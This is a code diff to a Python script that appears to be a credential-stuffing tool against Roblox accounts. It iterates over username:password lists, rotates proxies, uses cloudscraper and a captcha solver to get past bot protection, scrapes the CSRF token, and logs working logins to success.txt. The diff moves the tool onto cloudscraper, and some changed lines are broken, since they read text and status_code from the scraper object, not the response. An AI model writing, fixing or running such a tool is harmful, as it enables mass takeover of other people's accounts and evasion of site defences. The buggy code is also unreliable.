@@ -83,7 +83,7 @@ if use_capsolver:
 scraper = cloudscraper.create_scraper(**scraper_args)
 # Make an HTTP request to the login page to get the initial cookies
 
-session = requests.Session()
+# session = scraper.session()
 # session.get("https://www.roblox.com/Login")
 
 getheaders = {
@@ -99,7 +99,7 @@ getheaders = {
     'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.39'
 }
 
-response = session.get("https://www.roblox.com/login", headers=getheaders)
+response = scraper.get("https://www.roblox.com/login", headers=getheaders)
 soup = BeautifulSoup(response.content, 'html.parser')
 xcsrf_token = soup.find('meta', attrs={'name': 'csrf-token'})['data-token']
 # Create the success and failure files if they do not exist
@@ -130,13 +130,13 @@ for line in lines:
             proxy_parts = proxy.split(":")
             if len(proxy_parts) == 3:
                 proxy_type, proxy_address, proxy_port = proxy_parts
-                session.proxies.update({
+                scraper.proxies.update({
                     "http": f"{proxy_type}://{proxy_address}:{proxy_port}",
                     "https": f"{proxy_type}://{proxy_address}:{proxy_port}"
                 })
             elif len(proxy_parts) == 4:
                 proxy_type, proxy_address, proxy_port, proxy_auth = proxy_parts
-                session.proxies.update({
+                scraper.proxies.update({
                     "http": f"{proxy_type}://{proxy_auth}@{proxy_address}:{proxy_port}",
                     "https": f"{proxy_type}://{proxy_auth}@{proxy_address}:{proxy_port}"
                 })
@@ -144,7 +144,7 @@ for line in lines:
                 print(f"Invalid proxy format: {proxy}")
                 continue
         else:
-            session.proxies = {}
+            scraper.proxies = {}
     # Build the login request data
     data = {
         "ctype": "Username",
@@ -154,7 +154,7 @@ for line in lines:
 
     # Set the headers for the login request, including the X-CSRF-Token and a randomized User-Agent
     # response = session.get("https://www.roblox.com/Login")
-    response.raise_for_status()
+    # scraper.raise_for_status()
 
     # Solve captcha if present
     if use_capsolver:
@@ -174,19 +174,19 @@ for line in lines:
     'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.39',
     'x-csrf-token': xcsrf_token
 }
-    response = session.post("https://www.roblox.com/authentication/login", data=data, headers=postheaders)
+    response = scraper.post("https://www.roblox.com/authentication/login", data=data, headers=postheaders)
 
     # Check if the login was successful
-    if "Recommended For You" in response.text:
+    if "Recommended For You" in scraper.text:
         print(f"Success: {username}:{password}")
         with open("success.txt", mode='a') as success_file:
             success_file.write(f"{username}:{password}\n")
-    elif "Incorrect username or password." in response.text:
+    elif "Incorrect username or password." in scraper.text:
         print(f"Failure: {username}:{password}")
         with open("failure.txt", mode='a') as failure_file:
             failure_file.write(f"{username}:{password}\n")
     else:
-        print(f"Unknown: {username}:{password} (Response code: {response.status_code})")
+        print(f"Unknown: {username}:{password} (Response code: {scraper.status_code})")
         with open("unknown.txt", mode='a') as unknown_file:
             unknown_file.write(f"{username}:{password}\n")
 
